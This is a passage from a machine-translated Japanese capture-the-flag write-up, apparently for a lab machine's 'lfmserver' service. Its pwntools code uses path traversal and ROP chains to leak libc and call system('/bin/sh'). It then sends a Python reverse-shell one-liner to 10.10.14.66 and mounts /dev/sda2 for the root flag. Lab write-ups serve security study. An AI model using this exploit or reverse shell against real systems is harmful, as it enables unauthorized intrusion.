payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
うまくいきました！</font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、メモリリークを使用して、libcライブラリがロードされているアドレスを特定します。</font><font style="vertical-align: inherit;">これを行うには、読み込まれたlibcライブラリの書き込み関数のアドレスを取得します。</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、dup2関数のアドレス（最初の8バイト）を選択します。</font><font style="vertical-align: inherit;">アンロードされたライブラリ内のdup2関数のアドレスをそこから減算します。</font><font style="vertical-align: inherit;">これにより、libcのベースアドレスが検索されます。</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、行/ bin / shのアドレスを見つけます。</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それはROPを収集するために残り、標準I / O記述子（0、1、2）はプログラムに登録された記述子にリダイレクトされます（6としましょう）。</font><font style="vertical-align: inherit;">その後、システム関数が呼び出され、行/ bin / shのアドレスを渡します。</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
いいね！</font><font style="vertical-align: inherit;">ルートからシェルを取得します。</font><font style="vertical-align: inherit;">しかし、彼はすぐに死にます。</font><font style="vertical-align: inherit;">リスナーを実行し（nc -lvp 8765）、バック接続シェルをスローします。</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、安定したシェルがあります。</font><font style="vertical-align: inherit;">下の写真に完全なコードを示します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、ルートフラグを読み取ることはできません...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ルート3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
linpeasを実行して出力を確認すると、興味深いセクション、特に/ dev / sda2が見つかります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
すべてのブロックデバイスに関する情報を取得しましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、ルートパーティション/ dev / sda2があります。</font><font style="vertical-align: inherit;">ディレクトリを作成し、パーティションをマウントします。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ルートフラグを見つけます。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">Telegramで</font></a></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
参加でき</font><font style="vertical-align: inherit;">ます。</font><font style="vertical-align: inherit;">興味深い資料、統合されたコース、ソフトウェアを見つけることができます。</font><font style="vertical-align: inherit;">ITの多くの分野に精通している人々が集まるコミュニティをまとめましょう。そうすれば、ITと情報セキュリティの問題について常に互いに助け合うことができます。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja502258/index.html">ヘルプ/ドキュメント用のVue.jsコンポーネント</a></li>
<li><a href="../ja502260/index.html">ESP-NOWは、ESP8266およびESP32の代替通信プロトコルです。基本概念</a></li>
<li><a href="../ja502262/index.html">銀行のAIOpsと包括的モニタリングの理由、または顧客関係の構築について</a></li>
<li><a href="../ja502264/index.html">公開鍵インフラストラクチャ。自己分離の状態での証明書の発行</a></li>
<li><a href="../ja502266/index.html">IntelプラットフォームのAurora。エグザフロップス時代の夜明け</a></li>
<li><a href="../ja502272/index.html">「私は自分自身を感じます」など、愚痴に駆り立てられるその他の英語の規則を言わないでください</a></li>
<li><a href="../ja502274/index.html">ルートなしでAndroidの外部キーボードのレイアウトをカスタマイズする</a></li>
<li><a href="../ja502276/index.html">かんばん方式：例PNZ No. 2：トレーニングとコース</a></li>
<li><a href="../ja502278/index.html">Pythonテストを編集しない方法</a></li>
<li><a href="../ja502286/index.html">消防ロボット</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>